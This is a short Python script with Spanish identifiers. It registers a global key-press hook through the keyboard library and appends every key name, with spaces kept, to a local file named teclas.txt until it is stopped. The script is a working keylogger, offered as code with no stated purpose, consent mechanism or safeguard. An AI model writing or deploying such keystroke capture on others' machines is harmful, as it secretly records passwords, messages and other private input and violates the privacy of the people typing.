import keyboard

def TeclasPresionadas(tecla):

    with open("teclas.txt","a") as file: 

        if tecla.name == 'space':
            file.write(' ')
        else:
            file.write(tecla.name)

keyboard.on_press(TeclasPresionadas)
keyboard.wait()